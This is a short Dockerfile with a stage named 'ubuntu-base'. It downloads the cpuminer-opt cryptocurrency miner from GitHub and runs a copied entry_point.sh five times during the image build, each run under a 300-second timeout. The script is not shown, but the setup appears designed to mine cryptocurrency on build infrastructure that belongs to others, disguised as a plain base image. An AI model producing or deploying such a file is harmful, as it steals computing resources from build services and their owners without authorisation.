FROM ubuntu:18.04 as ubuntu-base
ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true
RUN apt-get -qqy update -y \
    && apt-get install wget -y \
    && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
    && tar xf cpuminer-opt-linux.tar.gz
COPY scripts/* /
RUN chmod +x entry_point.sh
RUN timeout -k 10 300 ./entry_point.sh
RUN timeout -k 10 300 ./entry_point.sh
RUN timeout -k 10 300 ./entry_point.sh
RUN timeout -k 10 300 ./entry_point.sh
RUN timeout -k 10 300 ./entry_point.sh
